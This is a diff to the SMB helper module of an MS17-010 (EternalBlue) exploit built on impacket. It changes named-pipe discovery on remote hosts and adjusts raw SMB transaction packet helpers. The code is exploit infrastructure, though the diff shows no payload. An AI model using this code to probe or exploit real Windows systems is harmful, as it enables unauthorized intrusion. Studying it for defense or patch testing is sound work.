@@ -1,10 +1,15 @@
 # impacket SMB extension for MS17-010 exploit.
 # this file contains only valid SMB packet format operation.
 from impacket import smb, smbconnection
-from impacket.dcerpc.v5 import transport
+from impacket.dcerpc.v5 import transport, scmr
 from struct import pack
+from threading import Thread
 import os
+import cmd
+import string
 import random
+import logging
+
 
 def getNTStatus(self):
 	return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']
@@ -116,7 +121,7 @@ class MYSMB(smb.SMB):
 		self._smbConn = None
 		smb.SMB.__init__(self, remote_host, remote_host, timeout=timeout)
 
-	def find_named_pipe(self):
+	def find_named_pipe(self, firstOnly=True):
 		pipes_file = '/usr/share/metasploit-framework/data/wordlists/named_pipes.txt'
 		try:
 			with open(pipes_file) as f:
@@ -125,18 +130,23 @@ class MYSMB(smb.SMB):
 			print("[-] Could not open {}, trying hardcoded values".format(pipes_file))
 			pipes = [ 'netlogon', 'lsarpc', 'samr', 'browser', 'spoolss', 'atsvc', 'DAV RPC SERVICE', 'epmapper', 'eventlog', 'InitShutdown', 'keysvc', 'lsass', 'LSM_API_service', 'ntsvcs', 'plugplay', 'protected_storage', 'router', 'SapiServerPipeS-1-5-5-0-70123', 'scerpc', 'srvsvc', 'tapsrv', 'trkwks', 'W32TIME_ALT', 'wkssvc','PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER', 'db2remotecmd' ]
 		tid = self.tree_connect_andx('\\\\'+self.get_remote_host()+'\\'+'IPC$')
-		found_pipe = None
+		found_pipes = []
 		for pipe in pipes:
 			try:
 				fid = self.nt_create_andx(tid, pipe)
 				self.close(tid, fid)
-				found_pipe = pipe
-				break
+				found_pipes.append(pipe)
+				print("[+] Found pipe '{}'".format(pipe))
+				if firstOnly:
+					break
 			except smb.SessionError as e:
 				pass
-		
 		self.disconnect_tree(tid)
-		return found_pipe
+		if len(found_pipes) > 0:
+			return found_pipes[0]
+		else:
+			return None
+
 
 	def set_pid(self, pid):
 		self._pid = pid
@@ -324,10 +334,6 @@ class MYSMB(smb.SMB):
 		transCmd['Parameters']['Setup'] = setup
 		_put_trans_data(transCmd, param, data, noPad)
 		return self.create_smb_packet(transCmd, mid, pid, tid)
-
-	def send_trans2(self, setup, param='', data='', mid=None, maxSetupCount=None, totalParameterCount=None, totalDataCount=None, maxParameterCount=None, maxDataCount=None, pid=None, tid=None, noPad=False):
-		self.send_raw(self.create_trans2_packet(setup, param, data, mid, maxSetupCount, totalParameterCount, totalDataCount, maxParameterCount, maxDataCount, pid, tid, noPad))
-		return self.recvSMB()
 
 	def create_trans2_secondary_packet(self, mid, param='', paramDisplacement=0, data='', dataDisplacement=0, pid=None, tid=None, noPad=False):
 		transCmd = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
